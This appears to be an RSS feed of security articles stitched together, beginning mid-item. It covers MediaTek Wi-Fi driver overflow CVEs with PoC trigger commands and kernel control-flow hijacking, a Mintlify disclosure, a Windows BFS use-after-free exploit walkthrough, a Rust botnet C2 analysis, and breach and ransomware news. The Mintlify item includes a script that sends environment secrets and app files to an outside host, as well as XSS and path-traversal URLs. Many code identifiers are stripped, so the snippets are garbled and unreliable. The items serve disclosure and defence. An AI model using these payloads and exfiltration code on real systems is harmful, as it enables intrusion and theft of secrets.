The root cause of the vulnerability is improper bounds checking of the attacker-controlled  value passed from userspace; rather than checking that the value does not exceed the size of the destination  field and exiting early if it does, the code does the  and checks that the incoming size if not  the destination field size, essentially forcing an overflow condition to occur. The overflow happens on the call to  and writes to . This is likely the result of a typo (using  when  was intended).The included PoC demonstrates the ability to corrupt the instruction pointer with an arbitrary address by chaining this bug with an info leak in the  subcommand handler.CVE-2025-20713: Stack Overflow in Set_BeaconReq_Proc Parsing of channel report list: MT7622 v5.0.5.4: Netgear WAX206 (confirmed)The function  in the  driver is vulnerable to a stack buffer overflow when handling the data passed in via the call to  which triggers the handler. Specifically, the issue is found in the code block that handles parsing of the “channel report list” command parameter field in the incoming command string. The issue occurs due to an unbounded  loop which uses a counter to index and write into a stack allocated buffer based on presence of the separate character  in the argument field. The values written to this buffer are 1-byte numeric values parsed using  from the attacker-controlled input.On a system where the kernel driver is installed, run the following  command to issue the IOCTL for the vulnerable code path via the  subcommand for  key value.python3 
iwpriv ra0 CVE-2025-20714: Stack Overflow in Set_BeaconReq_Proc Parsing of regulatory class parameterMediaTek assigned a CVE for this bug, but still claimed the bug was a duplicate because the overflow happens in the same function as the other two issues in this function (CVE-2025-20715, CVE-2025-20713). That’s it – that’s the only reason they used to argue it was a duplicate.: MT7622 v5.0.5.4: Netgear WAX206 (confirmed)The function  in the  driver is vulnerable to a stack buffer overflow when handling the data passed in via the call to  which triggers the handler. Specifically, the issue is found in the code block that handles parsing of the “regulatory class” command parameter field in the incoming command string (parameter index 7). The issue occurs due to an unbounded  loop which uses a counter to index and write into a buffer at RRM_MLME_BCN_REQ_INFO req_struct.reg_class[16] (stack allocated) based on presence of the separate character  in the argument field. The values written to this buffer are 1-byte numeric values parsed using  from the attacker-controlled input.On a system where the kernel driver is installed, run the following commands to create the payload buffer and issue the IOCTL for the vulnerable code path via the  subcommand for the  key value.python3

Specifically, the issue is found in the code block that handles parsing of the “request_ie” command parameter field in the incoming command string (parameter index 10). The issue occurs due to an unbounded  loop which uses a counter to index and write into a buffer at  based on presence of the separate character  in the argument field. The values written to this buffer are 1-byte numeric values parsed using  from the attacker-controlled input.On a system where the kernel driver is installed, run the following commands to create a payload buffer and run  to issue the IOCTL for the vulnerable code path via the  subcommand for  key value.python3 
iwpriv ra0 CVE-2025-20717: Stack Overflow in Set_Igmp_Flooding_CIDR_Proc: MT7622 v5.0.5.4: Netgear WAX206 (confirmed):  flagThe vulnerability occurs due to a lack of bounds checking when performing a copy operation of user-controlled data into a statically-sized buffer. This happens in the function Set_Igmp_Flooding_CIDR_Proc() when the contents of  (which contains the argument passed as the value of  in the  command) is copied to the local buffer  using . The copy operation uses the length of the string in  as it’s size argument without checking to ensure the string length does not exceed the size of the  buffer. Any argument with a length greater than 25 will result in a stack buffer overflow.On a system where the kernel driver is installed, run the following commands to create a payload buffer and run  to issue the IOCTL for the vulnerable code path via the  subcommand for  key value.python3

Within the body of the switch-case that handles this OID, an allocation is made of sizeof(WSC_UPNP_CTRL_WSC_BAND_STOP) and saved to the pointer . Assuming the allocation succeeds, a block is entered where  is called to copy data from userspace and write it to the memory allocated to , using  as the size argument for the copy operation.No upper bounds check is performed on the value in , which is attacker-controlled, prior to it’s use in the call to , leading to a heap buffer overflow if an attacker provides a  value that is greater than sizeof(WSC_UPNP_CTRL_WSC_BAND_STOP) (which evaluates to 12 bytes).Execute the PoC with a large bufsize argument:CVE-2025-20734: Heap Overflow in Set_SecWPAPSK_Proc: MT7622 v5.1.0.0, MT7629 v6.0.3.0, MT7981 driver v7.6.7.2: Netgear WAX206 (confirmed), SpaceX Starlink Wifi Gen2:  and  must be enabled in the build configuration.The vulnerability occurs in the function  when processing an attacker-controlled argument string. The function first checks if the length of the argument string is less than 65. If so, it enters a block where the key data is set. However, if the length exceeds 65, the function does not treat this as an error and continues execution.If the  build flag was enabled, the vulnerable code block is included in the function and is reached after the check above. Within this block:The length of the attacker-controlled argument string is calculated using The length value is used as the length argument in a call to  to write to No bounds checking is performed on the length of the argument string before this copy operation. Since  is statically sized at 64 bytes, any argument string longer than 64 bytes will overflow the buffer. Additionally, because  is used for the copy operation, there are no restrictions on the payload data, allowing the attacker to include null bytes or other arbitrary data in the overflow.Execute the commands below on a system running the vulnerable driver to trigger the bug.iwpriv ra0 python3

CVE-2025-20735: Heap Overflow in mtk_send_offchannel_action_frame: MT7622 v5.1.0.0: Driver must be built with  configuration option (this should also enable the CHANNEL_SWITCH_MONITOR_CONFIG flag)The vulnerability occurs in the function mtk_send_offchannel_action_frame(). The function allocates a fixed-size heap buffer  of 2304 bytes using the  macro. However, the function subsequently calls  to copy attacker-controlled data into this buffer without validating the size of the data.The size of the data to be copied is determined by the  field, which is passed from userspace via the IOCTL handler. If an attacker specifies a value larger than 2304 bytes, the  operation in  will write beyond the bounds of the allocated buffer, resulting in a heap buffer overflow.Compile and execute the PoC like this:CVE-2025-20736: Stack Overflows in Set_IgmpSn_AddEntry_Proc and Set_IgmpSn_DelEntry_ProcThis was another fun one. This pair of Add/Delete functions both contain basically the same bug which results in a buffer overflow. MediaTek argued that one of these was a duplicate by their definition because, and I kid you not, the two bugs occur in the same .: MT7622 v5.1.0.0:  enabledThe vulnerability occurs in the function Set_IgmpSn_DelEntry_Proc() when handling parsing of an IP address value from the argument string passed in from userspace. In this block, a  loop is used together with calls to  using the  character as a separator to parse the individual octets of the IP address string. Within this loop, there is no bounds checking done on the  iterator variable to ensure it does not exceed the size of the  buffer prior to using the  variable to index into the  buffer when writing the parsed numeric value from the argument token using . This results in an OOB write condition that can be used to corrupt the kernel stack if a string with more than 4 “.” characters is found.The vulnerability can be triggered using the following payload, which sends an overlong sequence formatted reach the bug.
iwpriv ra0 python3 The vulnerability occurs in the function Set_IgmpSn_AddEntry_Proc() when handling parsing of an IP address value from the argument string passed in from userspace. The vulnerable logic for this function is identical to that shown in Set_IgmpSn_DelEntry_Proc() above.The vulnerability can be triggered using the following payload, which sends an overlong sequence formatted reach the bug.
iwpriv ra0 python3 CVE-2025-20737: Stack Overflow + Info Leak in OID_802_11_PASSPHRASES Handler: MT7622 v5.1.0.0The vulnerability occurs in the handler for  (0x0536). The code creates a fixed-size stack structure  and then uses  to copy data from user space into this structure without validating that the incoming data size matches the structure size. The size of the structure is 68 bytes, meaning any length value greater than 68 will result in kernel stack corruption. Additionally, the code goes on to use whatever value is in the struct member  to print that many bytes from the contents of the  buffer without any bounds checking, resulting in disclosure of kernel memory to userspace in the kernel message buffer (dmesg).Execute the PoC below with the following parameters:CVE-2025-20738: Stack Overflow in Set_ApScan_Proc: MT7622 v5.1.0.0, MT7629 v6.0.3.0The  function contains a  loop that reads characters from the input argument string and writes them to a fixed-size stack buffer . The loop continues until it encounters a NULL byte in the input string. The issue is that there’s no check to ensure that the index  used to access the  array remains within bounds (0-32). If the input string is longer than 33 bytes and doesn’t contain a colon () or NULL byte within the first 33 characters, the loop will write beyond the bounds of the  array, causing a stack buffer overflow.Execute the command below on a system running the vulnerable driver to trigger the bug.iwpriv ra0 python3 CVE-2025-20739: Stack Overflow in Set_IgmpSn_BlackList_Proc: MT7622 v5.1.0.0:

The size argument given for the copy operation is calculated by measuring the length of the string in  (the source buffer) without any upper-bounds check to ensure the length of the argument string does not exceed the size of the destination buffer. An argument string which contains more than 100 characters will result in a buffer overflow of the  buffer.Execute the command below on a system running the vulnerable driver to trigger the bug.iwpriv ra0 python3 CVE-2025-20741: Heap Overflow in vie_oper_proc: MT7622 v5.1.0.0: Netgear WAX206 (confirmed)The function  in the  driver is vulnerable to a heap buffer overflow when handling the incoming command string passed in via the  handler and  interface. The overflow happens due to a lack of length restrictions on the parsing of a string token using  on the incoming string. This value is parsed and written to a heap allocated buffer, which can result in a heap buffer overflow if the length of the token exceeds the size of the allocated buffer. In this case, the size of the allocated buffer is calculated with the expression sizeof((MAX_VENDOR_IE_LEN + 1) * 2), which incorrectly calculates the size of the result of the arithmetic expression rather than using the result of the expression (as appears to be the intent). In effect, the allocation will always be for  bytes (4).On a system where the kernel driver is installed, run the following  command to issue the IOCTL for the vulnerable code path via the  command for the  key.iwpriv ra0 1-frm_map:1-oui:00bbaa-length:1194-ctnt:python3 CVE-2025-20748: Kernel Code Execution via OOB Write in SetRxvRecordEn: MT7622 v5.1.0.0: Netgear WAX206 (confirmed)The vulnerability occurs in the function , which is the handler for the  subcommand. Within this function, an attacker-controlled argument string is parsed using the insecure string function  without a length limit or upper bounds check on the length of the argument string. This results in a buffer overflow of the  buffer, contained within the device object for the underlying network interface. As there is no upper bounds on the write size, it’s possible to corrupt almost the entirety of the  object and beyond.PoC: Corrupt Kernel MemoryTo trigger the vulnerability and corrupt memory:iwpriv ra0 1-1-0-1-5-1-5-5-python After running the command, perform an operation that will result in the sending of a notification to enrolled notify handlers. An easy way to do this is to trigger a ‘link down’ operation on the interface via . Another option is to use the iwpriv ra0 set SSID=<anything>, which re-inits the interface and will trigger a notify call. A crash should occur in the function  upon access to a corrupted portion of the WifiSysInfo struct in the device struct for the interface.The PoC leverages the vulnerabilty to corrupt the adjacent  object to hijack execution flow in the kernel. This object contains linked lists pointing to  objects, which each contain a function pointer at notify_entry.notify_caller, so corrupting the pointers in the linked list can be used to point to a fake  object and use that to hijack execution flow when the embedded callback function is executed. The PoC makes use of a kernel info leak available through the iwpriv  subcommand handler to determine the address of memory containing controlled data in the kernel and writes a forged object to align with the  structure.Executing the PoC will result in execution being redirected to the address  (tested on the MediaTek MT7622 AX3600-gmac1-WAX206 board, Linux 4.x).

CVE-2025-20742: Heap Overflow in FT_R1khEntryInsert: MT7915 v7.4.0.0, MT7629 v6.0.3.0: Netgear WAX206, Starlink Wifi Gen2The vulnerability occurs due to a lack of bounds checking on the attacker-controlled values prior to using one of those values as the size argument to a write operation in . This function is reached via an ioctl to the RT_PRIV command with subcommand/OID , and expects the data sent from userspace to be in the format of a struct FT_KDP_EVT_KEY_ELM object. This object includes another embedded object of type , which has members representing the actual key material being transmitted. These members include a statically sized buffer  and a size value in , with the latter defining the actual size of the data in .After copying the argument data from userspace into a kernel allocated buffer in , this data is passed to  for processing/handling. Some initial parsing is done on the data and then it is cast to type  and some basic validation is done on some values of the struct. The code continues on to call  and passes in pointers to multiple members of the key element struct sent by the client, including the  and  members.In , an allocation is made to hold the data for an object of type  (148 bytes) and the values passed in as arguments to the function are used to initialize the new object. The vulnerability occurs when the  data is copied from the source buffer into a destination buffer using the  sent in the attacker-controlled key element struct without checking that it does not exceed the size of the destination (49 bytes). The  field of the  is of type , meaning that the maximum value it can hold is 255, so this is the max value that can be chosen by an attacker. This results in the ability to overflow the FT_KDP_PMK_KEY_INFO.R0khId[49] buffer by ~200 bytes.The attached PoC can be used to trigger the vulnerability and cause a crash like the one shown in the output below the PoC code. It may require more than a single run to corrupt memory enough to cause a crash but this will usually happen within 3 runs. NOTE: multiple runs will require changing the filler byte argument each run, otherwise the request won’t be seen as a new entry and no action will be taken.It will produce output like this upon crashing:[ 8566.183685] Unable to handle kernel paging request at virtual address 42424242424242

A full LPE exploit using this bug and a couple of others against the WAX206 has been written and will be released along with this post. More details will be given in an upcoming blog post :)That’s it! But more to come soon, including a deep dive into the full-chain exploit for CVE-2025-20742 and a deep dive into a few bugs  included in this post which impact the WPA EAPOL handlers and which are ! I’m also working on cleaning up some code I wrote earlier this year for a QEMU PCI device to emulate the MT7622 (at least enough to load the driver and interact with the ioctl handlers) which was  useful for debugging and reproducing bugs without the limitations on the test device I had access to. So, stay tuned :)]]></content:encoded></item><item><title>Interpol-led action decrypts 6 ransomware strains, arrests hundreds</title><link>https://www.bleepingcomputer.com/news/security/interpol-led-action-decrypts-6-ransomware-strains-arrests-hundreds/</link><author>Bill Toulas</author><category>security</category><pubDate>Mon, 22 Dec 2025 18:38:08 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[An Interpol-coordinated initiative called Operation Sentinel led to the arrest of 574 individuals and the recovery of $3 million linked to business email compromise, extortion, and ransomware incidents.

i deployed it to mintlify and went to the page it was on, and i got a request from a vercel/amazon ip! are they really doing this on their nextjs app?i wrote a simple script to exfilitrate some data such as the process.env (and app files) to find out: = () =>
  (, {
    : ,
    : .(data),
  });
({ : [{ : , : .(process.) }] });
 {
  ().( (a) => {
     arr = [];
     ( filename  a.(, { :  })) {
       (a.(filename).()) ;
       content = a.(filename, );
      arr.({ : filename, content });
    }
    .(arr.);
    ({ : arr });
    .();
  });
}  (error) {
  (error);
}
and, after running it, this is what i got:shit. this is bad, we have full access.i quickly realised that this was the server-side serverless (lol) environment of their main documentation app, while this calls to a external api to do everything, we have the token it calls it with in the env.alongside, we can poison the nextjs cache for everyone , allowing mass xss, defacing, etc on any docs site.we can also pretend nonexistent pages exist in the cache, allowing targeted xss toowith the other keys we could also:poisoned mintlifys analyticsruined mintlifys feature flaggingdos'ed customer sites via path validationstrigger a bunch of pdf exports which would jack up mintlifys cloudconvert billmass xss (on customer domains)targeted xss (on custom domains)targeted xss (CVE-2025-67842)after getting all of the server routes, i noticed a interesting one: /_mintlify/static/[subdomain]/{...path}. this route seemed to allow you to get static images from your repository, such as svgs, pngs, etc.what if i could access my organizations asset from another domain?well i tried, i crafted a url that looked likehttps://discord.com/_mintlify/static/evascoolcompany/xss.svg
which, the svg on my repository having this content:and when i went to the url, i got this:this allows complete 1 click xss on users who click a link. definitely not great, but it makes the fact worse that most companies dont properly scope cookies, or have their documentation on a subpath (such as ).the latter was true in discords case, their documentation was on , and i can just get the  value from localstorage directly, and exfiltrate it using whatever i wantsome other companies that i could do full exploitation on are twitter, vercel and cursor. though we did not check many companies and there is definitely morea few hours after i started looking into this, i got an unexpected, sort of out of nowhere message from a friend, hackermon, who had found the targeted xss independently aswellwe started looking into this together, alongside mdl, who was also looking into it with hackermonalso checkout their blogposts here and here! (respectively)we also got in contact with mintlify, and started disclosing everything we already had and future things directly to themhere comes the patch bypass (CVE-2025-67845)after mintlify patched the targeted xss via static, i was looking at the code for the route and had an ideathe code for the endpoint looked like this (not exact, recreation):() {
   { subdomain, : pathParts } =  params;
   path =  + pathParts.();

   url = ;
   res = (url);

   (!res.)
    (, {
      : ,
    });

   res; 
}
and i realised, nothing prevents us from adding url encoded path traversal in a part of a path, to climb up the cdn pathso i crafted a url and tested, it looked likehttps://discord.com/_mintlify/static/discord/images/create-team-owned-app.png%2F..%2F..%2F..%2Fevascoolcompany%2Fxss.svg

The RC4 fallback has been a favorite weakness hackers have exploited to compromise enterprise networks. Use of RC4 played a key role in last year’s breach of health giant Ascension. The breach caused life-threatening disruptions at 140 hospitals and put the medical records of 5.6 million patients into the hands of the attackers. US Senator Ron Wyden (D-Ore.) in September called on the Federal Trade Commission to investigate Microsoft for “gross cybersecurity negligence,” citing the continued default support for RC4.Last week, Microsoft said it was finally deprecating RC4 and cited its susceptibility to Kerberoasting, the form of attack, known since 2014, that was the root cause of the initial intrusion into Ascension’s network.Fun fact: RC4 was a trade secret until I published the algorithm in the second edition of  in 1995.]]></content:encoded></item><item><title>Fake WhatsApp API Package on npm Steals Messages, Contacts, and Login Tokens</title><link>https://thehackernews.com/2025/12/fake-whatsapp-api-package-on-npm-steals.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivmlgJ1Ik_0R32UVEqmVu8yRjzKyNEMijqN7ox6JMNp9RQFOtpeBhDHEcgQH6eL6SgRRF3z6pH4YHh2fanPXGIIyrMJIUZ72Nm4JOWYycoqFnvzyFcbuufQHdjxdde1_MIZ0SiSsG8EyrzC0KpF-pO4Nvzpg2OtpApM_F0pZizo46YpYmU6Jj0dA1YvHiz/s1600/whatsapp-api.jpg" length="" type=""/><pubDate>Mon, 22 Dec 2025 16:28:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have disclosed details of a new malicious package on the npm repository that works as a fully functional WhatsApp API, but also contains the ability to intercept every message and link the attacker's device to a victim's WhatsApp account.

What started as a quick triage turned into a deep dive-reverse engineering the custom bincode C2 protocol, tracing the attack back to exposed Docker APIs, and finally building a fake bot to infiltrate the botnet itself. That C2 honeypot is now live, monitoring attack targets in real-time and tracking how the malware evolves.0/60+ engines at time of captureUnauthenticated Docker API (TCP/2375)Rust-based DDoS bot with UDP/TCP flood capabilitiesCustom bincode serializationSingle server for distribution (port 80) and C2 (port 8080)HTTP-based binary replacement mechanismCustom C2 honeypot tracking live attack targetsThe Attack Vector: Docker API ExploitationThe first surprise came from analyzing my honeypot logs. The malware wasn’t delivered through SSH brute-forcing or web exploits it exploited unauthenticated Docker APIs exposed on port 2375.This attack pattern targets thousands of misconfigured Docker hosts across the internet. The speed and automation suggest it’s part of a larger scanning botnet.A critical discovery: the C2 server serves dual purposes:From a defensive standpoint, this is encouraging: the architecture is straightforward and brittle, with a single point of failure that makes it trivial to dismantle. 😎Static Analysis: Identifying Rust SignaturesThe binary was stripped (no debug symbols), but at 1.5MB, it clearly contained a modern runtime. Running  confirmed my suspicion: .Key libraries identified in the binary:These libraries revealed the malware’s sophistication:: High-performance async networking: Encoding and decoding custom binary protocol (not JSON/HTTP): Compile-time string obfuscation to hide IoCsFor the reverse engineering phase, I used  with the GhidRust plugin, which significantly improved the decompilation quality by reconstructing Rust-specific structures and types. Without it, analyzing Rust binaries in Ghidra produces nearly unreadable output due to the language’s unique memory management patterns and enum representations.Dynamic Analysis: Catching the C2 LiveI set up a multi-layered sandbox for safe execution: Docker running inside an , providing defense-in-depth against potential container escapes. The malware ran in a hardened container with minimal privileges:Dockerfile of :Execute the container with strict resource limits:The server was live and accepting connections. This was the breakthrough moment.The complete C2 communication follows this sequence:My initial reverse engineering suggested a SHA256 proof-of-work mechanism. The reality was simpler. Here’s the actual 87-byte handshake:Packet type:  (Handshake)Username:  (hardcoded)Nonce: "handshake_" + (timestamp * 10) — a predictable patternTimestamp: Unix timestamp (e.g.,  = )The server responded with a simple  (0x4F4B)—no cryptographic challenge required. Our earlier probes received  (0x4E4F) because we were sending the wrong packet format based on static analysis assumptions.username + nonce + timestampImmediately after the handshake, the server pushed an UPDATE command:The bot downloaded a fresh 1.5MB binary the auto-update mechanism in action.The protocol has several weaknesses that enabled our monitoring:No cryptographic authentication: The predicted SHA256 PoW doesn’t exist: Based on timestamp, easily reproducible:  is the same for all bots: All traffic in cleartext (no TLS)This made impersonating a bot trivial once we understood the real protocol. 🍯 🪤Static vs Dynamic: Lessons LearnedThis analysis reinforced a critical principle:Never trust static analysis alone. Always validate with dynamic execution.Static Analysis PredictedDynamic Analysis RevealedSHA256 proof-of-work (32 bytes)Username + timestamp-based noncevariant (u8) + pow ([u8; 32])Complex struct with length-prefixed stringsASCII “OK” (0x4F4B) / “NO” (0x4E4F)Immediate after successful handshakePredictable: "handshake_" + timestamp*10The  structures I found were likely dead code or planned features never implemented.⚠️ : At the time of capture (10 days ago), this sample had  across 60+ antivirus engines. This highlights why proactive threat hunting and honeypots are essential relying solely on signature-based detection would have missed this threat entirely.Ongoing Monitoring: C2 HoneypotAfter fully decoding the protocol, I developed a custom honeypot that impersonates a bot connecting to the C2 server. This fake bot successfully completes the handshake and receives commands from the attacker’s infrastructure.This approach allows me to passively monitor:: Which IPs/domains are being DDoSed: UDP vs TCP flood, duration, intensity: Command frequency, update cycles: Protocol changes or new attack typesThe monitoring is ongoing, and I’m collecting data on the botnet’s targets. A follow-up post with aggregated findings may come once enough data is gathered.🔍 : By operating a fake bot inside the botnet, we gain visibility into real-world attacks as they happen intelligence that’s impossible to obtain through traditional defensive measures alone.Pro Tips: Honeypot Configuration for Docker API AttacksIf you want to capture similar attacks, configure Beelzebub to simulate a vulnerable Docker API:Or low interaction docker API honeypot configuration by Akamai hunt Github repoThe fact that zero antivirus engines detected this sample when I captured it 10 days ago demonstrates that attackers are winning the evasion game, Rust’s compiled binaries, combined with string obfuscation, effectively bypass traditional signature-based detection!: Zero detection at capture timeRust malware is increasing: Harder to reverse engineer, better performance, lower detection ratesStatic analysis has limits: Always validate with dynamic execution: A custom C2 honeypot now provides real-time visibility into botnet operations 👀The C2 honeypot is actively monitoring attack commands.

You may therefore receive emails claiming they have your personal information. As a reminder, we will never ask for your password or payment information by email.”Pornhub is one of the world’s most visited adult video-sharing websites, allowing users to view content anonymously or create accounts to upload and interact with videos.Pornhub has reported that on November 8, 2025, a security breach at third-party analytics provider Mixpanel exposed “a limited set of analytics events for certain users.” Pornhub stressed that this was not a breach of Pornhub’s own systems, and said that passwords, payment details, and financial information were not exposed. Mixpanel confirmed it experienced a security incident on November 8, 2025, but disputes that the Pornhub data originated from that breach. The company stated there is: “No indication that this data was stolen from Mixpanel during our November 2025 security incident or otherwise.”Regardless of the source, cybercriminals commonly attempt to monetize stolen user data through direct extortion. At the moment, it is unclear how many users are affected, although available information suggests that only Premium members had their data exposed.In October, we reported that one in six mobile users are targeted by sextortion scams. Sextortion is a form of online blackmail where criminals threaten to share a person’s private, nude, or sexually explicit images or videos unless the victim complies with their demands—often for more sexual content, sexual favors, or money.Having your email address included in a dataset of known Pornhub users makes you a likely target for this type of blackmail.How to stay safe from sextortionUnless you used a dedicated throwaway email address to sign up for Pornhub Premium, you should be prepared to receive a sextortion-type email. If one arrives:Any message referencing your Pornhub use, searches, or payment should be treated as an attempt to exploit breached or previously leaked data.Never provide passwords or payment information by email. Pornhub has stated it will not ask for these.Do not respond to blackmail emails. Ignore demands, do not pay, and do not reply—responding confirms your address is actively monitored.Save extortion emails, including headers, content, timestamps, and attachments, but do not open links or files. This information can support reports to your email provider, local law enforcement, or cybercrime units.Change your Pornhub password (if your account is still active) and ensure it’s unique and not reused anywhere else.Review your bank and card statements for unfamiliar charges and report any suspicious transactions at once.If you used a real-name email address for Pornhub, consider moving sensitive subscriptions to a separate, pseudonymous email going forward.Use , our simple scam response framework to help protect against scams. — Don’t let urgency or pressure push you into action. Take a breath before responding. Legitimate businesses like your bank or credit card don’t push immediate action.  — If you answered the phone and are feeling panicked about the situation, likely involving a family member or friend, ask a question only the real person would know—something that can’t be found online. —: If it feels off, hang up or end the conversation. You can always say the connection dropped. — Confirm the person is who they say they are by reaching out yourself through a trusted number, website or method you have used before. Should you have doubts about the legitimacy of any communications, submit them to Malwarebytes Scam Guard.

(@flyingpassword)About 2 years ago, Microsoft first released Win32-App-isolation which is a sandbox-like mechanism to further separate application access to resources on Windows clients. Brokering File System (BFS) was released around the same time to specifically handle file access from these isolated applications. Because this is potentially reachable from inside isolated/sandboxed applications, it is an interesting and fresh targets for privilege escalation.In this post, we will take a deeper look into CVE-2025-29970, a use-after-free vulnerability in , which was previously discovered by HT3Labs. The analysis was done on  version .Brokering File System (BFS) is developed together with the AppContainer feature on Windows, and later on, AppSilo (Win32-Isolated Application). It is a mini-filter driver that is responsible for managing I/O operations that originate from file, pipe and registry operations.There are a few data structures that BFS uses to internally manage access to these resources.BFS uses the  structure to store s in a hash table. The ’s are looked up in various operations that will be explained below. To avoid race conditions, it also utilizes a  member. contains information about the entity that the policy is applicable to, for example:  and . It has an accompanying  that contains specific paths that the User running the AppContainer can or cannot access. Because  is a very common object referred to in a lot of operations, it has a  member. stores information about the paths concerned in its attached . Its internal representation uses a bit map, a linked list called  and an AVL table (a type of self-balancing tree). The choice of these structures is due to the parallel storing of a serialized format of policies on disk and an in-memory format as a binary tree and linked list for fast lookup and manipulation.The  is a linked list that stores the list of files and subdirectories under a directory that concerns the same . Only the list head is stored in the , each entry in the list carries a data buffer (currently for unknown usage) and an offset of that entry in the serialized file format stored on disk.BFS utilizes a few common operations like create, insert, modify, delete, remove on its objects (PolicyEntry, StorageObject, DirectoryBlockList, etc). The following diagram captures the general interactions among some important operations. Note that each node in the diagram is not necessarily a 1:1 correspondence to a function or object in BFS, it is only meant to be for a general understanding of the BFS operations.There are a few noteworthy operations that concern the aforementioned objects: is initialized during  along with other driver initialization is allocated in  if access to a new path is requested.During the initialization of ,  will allocate a new  that attaches to the newly created A Root Directory is associated with a , which will create a  in A  can be added, modified or cleaned up in BfsProcessSetPolicyRequest, and it can be do so via  and , which get passed the  reference obtained from The  along with its  is deallocated in , which is a result from calling the BfsProcessDeletePolicyEntryRequest IOCTLThe naming of  vs.  may be a bit confusing, they perform two different things: will clean up the data of a particular entry on disk, meaning reference to the entry is not deallocated. will deallocate the memory for the entry entirely.CVE-2025-29970 is a use-after-free vulnerability concerning the  object, which is essentially a linked-list. Its vulnerable life-cycle is explained in the following diagrams:When a policy is added via the BfsProcessSetPolicyRequest IOCTL, a  is created, which involves allocating and initializing a  that contains a .When policies are removed via the BfsProcessDeletePolicyEntryRequest,  is deallocated, among with its members. During the deallocation process, its  is cleaned up by iterating through its  and deallocating each entry in the linked-list. The deallocation loop in  is where the use-after-free vulnerability happens. Let’s look closely at its code below to understand:The local loop variable  is assigned the  member from the  being cleaned up. This member, as explained previously, is the  of the linked-list. Each iteration does the following:Retrieve the first entry of the linked-list from  [1]. Note that, the first entry in this context is  the same as the head of the linked-list. More information can be found here about Microsoft’s linked-list.Perform various sanity checks of linked-list integrityUnlink the current node from the linked-listDeallocate the accompanying  of the current node [2], then deallocate the node itself [3].The head of the linked-list is deallocated [4].We can see how this logic is flawed, because a linked-list may, and very often contains more than one entry. This means, the head of the list is deallocated at the end of the first iteration, and it is being dereferenced again at the beginning of the second iteration to clean up subsequent entries. This is obviously a use-after-free scenario.In the patch for this vulnerability, the deallocation loop is separated into another function The vulnerable free has been moved outside the loop [5]. It ensures that the content of the linked-list is totally deallocated before its head is deallocated.This vulnerability is very unlikely to turn into further useful primitives like information leak or arbitrary read/write. This is due to:Limited use of the UAF’d pointer, no write to it, and no read from it into a memory that can be returned to users, only dereferencing.Very tight window from free to use, making it very difficult to reclaim the freed memory and replace it with malicious data.To reach the vulnerable code and trigger the bug, we need to meet a few requirements:The  passed to the IOCTLs must contain a specific token to trigger BFS IOCTLs.There must be  exists in the  by the time of removal request.The  must have a .Step 1: Acquiring the right tokenNot every process is under BFS’ management. Therefore, various IOCTLs in the driver include a check for the right token before proceeding. We need to obtain the token before we can make IOCTL requests by impersonating a suitable process. The method and reason have previously been discussed in HT3’s researchStep 2: Adding Policy Entries to the Policy TableTo successfully call the vulnerable function, we need to have existing policy entries present in the policy table, so the removal function is triggered. Policies can be added in multiple ways, programmatically via IOCTL in the driver, or interactively when Isolated WIn32 applications request file access. In our exploit, we will apply the programmatic method:The input of the IOCTL is a struct that contains information about the requested operation, the path to apply the policy on, the type of the path (file or directory)Note that the  includes a  operation, but this is different from the IOCTL we are targeting in the next step, as explained previously in BFS Operations. This operation disables the  rather than entirely removing it from the , therefore, it does not trigger the deallocation of the .There are some constraints on the path that the  is referring to:The path must exist. Therefore, we need to create the file or directory we are using in the IOCTL.The impersonated token must have access to this path. This seems to be the limit of adding policies programmatically, therefore, we choose the temporary directory of the package we are impersonating here:
C:\Users\​test\​AppData\​Local\Packages\​MicrosoftWindows.​Client.​WebExperience​_cw5n1h2txyewy\​AC\Temp\.
When we create policy entries this way, it conveniently creates a  that is attached to each entry, which satisfies one of the requirements. There are a few other types of policy entries that can be created through various operations like Registry Key, Pipes, but it does not concern this vulnerability, and some of these entries do not have a  attached (like Registry Key).Step 3: Triggering  RemovalThis function is reached via the BfsProcessDeletePolicyRequest IOCTL, and its input is simply the previously impersonated token.The exploit flow can be summarized as follows:Note that, while we’re supposed to get an immediate BSOD when the UAF happens, it does not seem so in practice because the object is small (size 0x20) and the freed memory is not immediately cleaned up, leaving dangling pointers (that are still valid!) that will get the loop going without any access violation. Therefore, we need to repeatedly perform adding and removing policy entries for the freed memory to be reclaimed and the data becomes invalid.From testing with various ILs and with the current methods of acquiring the right token to run the exploit, it seems that the BFS device can only be accessed from a Medium IL process. For that reason, the following combinations did not work:Injecting into Adobe Reader renderer process that run as a Low IL AppContainer: It neither has an  token nor has the privileges to impersonate one.Running the exploit from an AppSilo that run as a Low IL AppContainer: Even though it has an  token, but it fails to get access to the BFS device.
Other than these failed attempts, injecting into a Medium IL process still works.If the steps are performed properly, we will get a BSOD:Even though BFS is a fairly simple and small driver, vulnerabilities like this have constantly made appearance in recent Patch Tuesday. With the increasing efforts in sandboxing applications on Windows, drivers like this remain a promising attack surface and are definitely worth keeping an eye on.]]></content:encoded></item><item><title>Revisiting CVE-2025-50165: A critical flaw in Windows Imaging Component</title><link>https://www.welivesecurity.com/en/eset-research/revisiting-cve-2025-50165-critical-flaw-windows-imaging-component/</link><author></author><category>threatintel</category><pubDate>Mon, 22 Dec 2025 09:55:00 +0000</pubDate><source url="https://www.welivesecurity.com/">ESET WeLiveSecurity</source><content:encoded><![CDATA[A comprehensive analysis and assessment of a critical severity vulnerability with low likelihood of mass exploitation]]></content:encoded></item><item><title>Ukrainian hacker admits affiliate role in Nefilim ransomware gang</title><link>https://www.bleepingcomputer.com/news/security/ukrainian-hacker-admits-affiliate-role-in-nefilim-ransomware-gang/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Mon, 22 Dec 2025 09:46:45 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[A Ukrainian national pleaded guilty on Friday to conducting Nefilim ransomware attacks that targeted high-revenue businesses across the United States and other countries.

